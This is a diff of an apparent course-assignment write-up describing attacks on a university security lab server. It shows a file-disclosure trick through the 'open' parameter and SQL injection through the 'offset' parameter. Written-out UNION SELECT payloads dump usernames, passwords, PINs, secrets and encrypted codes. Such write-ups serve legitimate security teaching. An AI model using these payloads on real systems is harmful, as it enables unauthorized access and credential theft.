@@ -91,16 +91,17 @@ But the following does NOT work:
 
 Once I successfully logged in, I started exploring the UI and all its features.
 I noticed the link “Warning!” which led to the URL `https://kbe.felk.cvut.cz/index.php?open=warning.txt`.
-Almost immediately I tried replacing `warning.txt` with `index.php`.
+Almost immediately, I tried replacing `warning.txt` with `index.php`.
 And to my pleasant surprise, the server responded with a highlighted source code of the index.php.
-After a quick look, I figured it must be the same index.php that is actually running on the server.
+After a quick look, I confirmed it must be the same index.php that is actually running on the server.
 
 **Note 3:** In fact, no login is needed to access https://kbe.felk.cvut.cz/index.php?open=index.php.
+
 **Note 4:** The code (line 67) confirms my suspicions from [Task 3's Side note](#side-note).
 
-The next feature I noticed was the pagination mechanism of messages which was using `offset` query parameter.
-By looking into the code I quickly constructed offset values that helped me obtain the names of the database tables and
-their column names:
+The next feature I noticed was the pagination mechanism of messages which was using the `offset` query parameter.
+By looking into the code, I quickly constructed such offset values that helped me obtain the names of the database
+tables, their column names and their data:
 
 ```
 0 UNION SELECT table_name, 1 FROM information_schema.tables
@@ -110,9 +111,10 @@ their column names:
 
 0 UNION SELECT CONCAT(username, '\t', password, '\t', pin, '\t', secret, '\t', salt), 1 FROM users
 0 UNION SELECT CONCAT(username, '\t', base64_message_xor_key, '\t', date_time), 1 FROM messages
+0 UNION SELECT CONCAT(username, '\t', aes_encrypt_code), 1 FROM codes
 ```
 
-The database has 3 tables with the following columns:
+The database has 3 tables _(apart from the MySQL system tables)_ with the following columns:
 
 * users
 	* username
@@ -127,3 +129,14 @@ The database has 3 tables with the following columns:
 * codes
 	* username
 	* aes_encrypt_code
+
+The tables contain the following data:
+
+* users – 8 rows – [users.tsv](./users.tsv)
+* messages – 24 rows – [messages.tsv](./messages.tsv)
+* codes – 9 rows – [codes.tsv](./codes.tsv)
+
+
+## Task 8
+
+See my solution of [Task 4](#task-4).
